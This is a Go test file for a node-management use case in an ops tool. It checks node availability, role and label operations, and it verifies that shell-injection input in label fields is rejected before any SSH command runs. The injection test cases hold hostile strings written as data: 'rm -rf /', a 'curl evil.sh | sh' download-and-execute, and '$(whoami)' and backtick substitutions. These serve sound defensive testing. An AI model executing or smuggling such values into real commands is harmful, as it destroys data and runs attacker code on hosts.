package usecases

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/Dall06/tarhiata-ops/srv/sys/domain"
	"github.com/Dall06/tarhiata-ops/srv/sys/repositories"
	"github.com/Dall06/tarhiata-ops/srv/sys/tests/mocks"
)

func TestManageNodesUseCase_Operations(t *testing.T) {
	tmpDir, err := os.MkdirTemp("", "tarhiata_nodes_test")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)

	dbPath := filepath.Join(tmpDir, "test.db")
	repo, err := repositories.NewSQLiteRepository(dbPath)
	if err != nil {
		t.Fatalf("failed sqlite init: %v", err)
	}
	defer repo.Close()

	mockSSH := mocks.NewMockSSHExecutor()
	uc := NewManageNodesUseCase(repo, mockSSH)

	config := domain.ServerConfig{Host: "127.0.0.1"}

	// Update Node Availability
	err = uc.UpdateNodeAvailability("node-1", "drain", config)
	if err != nil {
		t.Fatalf("unexpected error updating availability: %v", err)
	}

	// Set Node Role
	err = uc.SetNodeRole("node-1", "manager", config)
	if err != nil {
		t.Fatalf("unexpected error setting role: %v", err)
	}

	// Add Node Label
	err = uc.AddNodeLabel("node-1", "tier", "frontend", config)
	if err != nil {
		t.Fatalf("unexpected error adding label: %v", err)
	}

	// Remove Node Label
	err = uc.RemoveNodeLabel("node-1", "tier", config)
	if err != nil {
		t.Fatalf("unexpected error removing label: %v", err)
	}
}

func TestManageNodesUseCase_RejectsCommandInjectionInLabels(t *testing.T) {
	mockSSH := mocks.NewMockSSHExecutor()
	uc := NewManageNodesUseCase(nil, mockSSH)
	config := domain.ServerConfig{Host: "127.0.0.1"}

	tests := []struct {
		name   string
		action func() error
	}{
		{
			name: "AddNodeLabel rechaza clave con inyección de comando",
			action: func() error {
				return uc.AddNodeLabel("node-1", "tier; rm -rf /", "frontend", config)
			},
		},
		{
			name: "AddNodeLabel rechaza valor con inyección de comando",
			action: func() error {
				return uc.AddNodeLabel("node-1", "tier", "frontend && curl evil.sh | sh", config)
			},
		},
		{
			name: "AddNodeLabel rechaza nodeID con inyección de comando",
			action: func() error {
				return uc.AddNodeLabel("node-1 $(whoami)", "tier", "frontend", config)
			},
		},
		{
			name: "RemoveNodeLabel rechaza clave con inyección de comando",
			action: func() error {
				return uc.RemoveNodeLabel("node-1", "tier`id`", config)
			},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if err := tc.action(); err == nil {
				t.Fatal("expected error, got nil")
			}
			if len(mockSSH.CommandsExecuted) != 0 {
				t.Fatalf("no debería haberse ejecutado ningún comando SSH, se ejecutaron: %v", mockSSH.CommandsExecuted)
			}
		})
	}
}
